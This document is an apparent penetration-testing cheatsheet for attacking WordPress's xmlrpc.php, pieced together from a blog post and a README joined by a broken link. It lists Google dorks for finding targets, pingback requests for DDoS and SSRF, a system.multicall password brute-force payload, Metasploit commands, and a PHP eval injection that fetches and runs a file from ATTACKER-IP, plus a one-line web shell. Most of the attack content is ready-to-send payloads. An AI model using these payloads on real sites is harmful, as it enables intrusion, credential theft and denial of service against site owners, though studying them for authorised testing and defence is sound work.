[XML-RPC](https://codex.wordpress.org/XML-RPC_Support) on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site. The XML-RPC API that WordPress provides several key functionalities that include:

- Publish a post
- Edit a post
- Delete a post.
- Upload a new file (e.g. an image for a post)
- Get a list of comments
- Edit comments

For instance, the Windows Live Writer system is capable of posting blogs directly to WordPress because of XML-RPC.

Unfortunately on the normal installation (not tampered with settings, and/or configs) of WordPress the XML-RPC interface opens two kinds of attacks:

- **XML-RPC pingbacks**
- **Brute force attacks via XML-RPC**

According to the WordPress documentation ([https://codex.wordpress.org/XML-RPC_Support](https://codex.wordpress.org/XML-RPC_Support)), XML-RPC functionality is turned on by default since WordPress 3.5.

Note that in this tutorial/cheatsheet the domain “example.com” is actually an example and can be replaced with your specific target.

## Dorks for finding potential targets[](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/#dorks-for-finding-potential-targets)

I would like to add that **any illegal action is your own**, and I can not be held responsible for your actions against a vulnerable target. Test only where you are allowed to do so. Go for the public, known bug bounties and earn your respect within the community.

That’s being said, during bug bounties or penetration testing assessments I had to identify all vulnerable WordPress targets on all subdomains following the rule `*.example.com`. In this specific case I relied on Google dorks in order to fast discovery all potential targets:

- `inurl:"/xmlrpc.php?rsd"` + scoping restrictions
- `intitle:"WordPress" inurl:"readme.html"` + scoping restrictions = general wordpress detection
- `allinurl:"wp-content/plugins/"` + scoping restrictions = general wordpress detection

## Searching for XML-RPC servers on WordPress:[](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/#searching-for-xml-rpc-servers-on-wordpress)

Steps to check:

1. Ensure you are targeting a WordPress site.
2. Ensure you have access to the `xmlrpc.php` file. In general, it is found at https://example.com/xmlrpc.php and would reply to a GET request with: `XML-RPC server accepts POST requests only.`
3. It will be pointless to target an XML-RPC server which is disabled/hardcoded/tampered/not working. Therefore, we will check its functionality by sending the following request:

Post Request:

```

```](<# xmlrpc-attack
Exploiting the xmlrpc.php 
%3Cbr%3E<br>

## Dorks for finding potential targets
- inurl:"/xmlrpc.php?rsd"
- intitle:"WordPress" inurl:"readme.html"
- allinurl:"wp-content/plugins/"

## Searching for XML-RPC servers on WordPress :
- Post Method :
  
  ```xml
  POST /xmlrpc.php HTTP/1.1
  Host: example.com
  Content-Length: 135

  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```

- The normal response should be :

  ```xml
    HTTP/1.1 200 OK
    Date: Mon, 01 Jul 2019 17:13:30 GMT
    Server: Apache
    Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
    Connection: close
    Vary: Accept-Encoding
    Referrer-Policy: no-referrer-when-downgrade
    Content-Length: 4272
    Content-Type: text/xml; charset=UTF-8
    
    <?xml version="1.0" encoding="UTF-8"?>
    <methodResponse>
      <params>
      <param>
        <value>
      <array><data>
    <value><string>system.multicall</string></value>
    <value><string>system.listMethods</string></value>
    <value><string>system.getCapabilities</string></value>
    <value><string>demo.addTwoNumbers</string></value>
    <value><string>demo.sayHello</string></value>
    <value><string>pingback.extensions.getPingbacks</string></value>
    <value><string>pingback.ping</string></value>
    <value><string>mt.publishPost</string></value>
    ...
    <value><string>wp.getUsersBlogs</string></value>
    </data></array>
        </value>
      </param>
    </params>
    </methodResponse>

  ```
<br><br>
## XML-RPC pingbacks attacks
1. Distributed denial-of-service (DDoS) attacks<br>
2. Cloudflare Protection Bypass (find real server ip)<br>
3. XSPA (Cross Site Port Attack)<br>

```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 303

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://postb.in/1562017983221-4377199190203</string></value>
</param>
<param>
<value><string>https://example.com/</string></value>
</param>
</params>
</methodCall>
```

response :
```xml
HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 21:53:56 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 370
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string></string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```
<br><br>
## Brute force attacks
```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>
```

response :
```xml
HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 23:02:55 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 1043
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```
<br><br>
## PHP XML-RPC Arbitrary Code Execution
This exploits an arbitrary code execution flaw discovered in many implementations of the PHP XML-RPC module. This flaw is exploitable through a number of PHP web applications, including but not limited to Drupal, Wordpress, Postnuke, and TikiWiki.
<br><br>
To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced' :

```
msf > use exploit/unix/webapp/php_xmlrpc_eval
msf exploit(php_xmlrpc_eval) > show targets
    ...targets...
msf exploit(php_xmlrpc_eval) > set TARGET < target-id >
msf exploit(php_xmlrpc_eval) > show options
    ...show and set options...
msf exploit(php_xmlrpc_eval) > exploit
```
<br><br>
## XML-RPC remote code-injection
XML-RPC for PHP is affected by a remote code-injection vulnerability. Pear XML_RPC version 1.3.0 and earlier and PHP XMLRPC version 1.1 and earlier, are vulnerable to PHP remote code injection. The XML parser will pass the data in XML elements to PHP eval() without sanitizing the user input. Lack of parameter filtering allows a remote attacker to execute arbitrary code in the context of the web server.


  
 Exploit : 
> The attacker sends the below XML data in the HTTP POST to the vulnerable server. The XML element <name> contains the PHP command injection. XML-RPC will pass the XML elements to PHP eval() without validating the user input. Upon execution, PHP command drops a malicious script to the tmp directory & modifies the file permission to allow execution.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>test.method</methodName>
  <params>
    <param>
      <value>
        <name>',"));echo '_begin_';echo `cd /tmp;wget ATTACKER-IP/evil.php;chmod +x evil.php;./nikons `;echo '_end';exit;/*</name>
      </value>
    </param>
  </params>
</methodCall>

```
<sub>xml data with PHP command injection</sub>
<br><br>
evil.php :
```php
<?php system($_GET['cmd'];)?>
```
  
<br>
The uploaded malicious php can be a backdoor. It allows the  attacker to execute malicious shell commands by sending a GET request to http://target.com/evil.php?cmd=ls

## XMLRPC SSRF
```xml
<methodCall>
 <methodName>pingback.ping</methodName>
  <params><param>
  <value><string>https://YOUR_SERVER</string></value>
</param><param>
<value><string>https://SOME_VALID_BLOG_FROM_THE_SITE</value></string>
</param></params>
</methodCall>
```

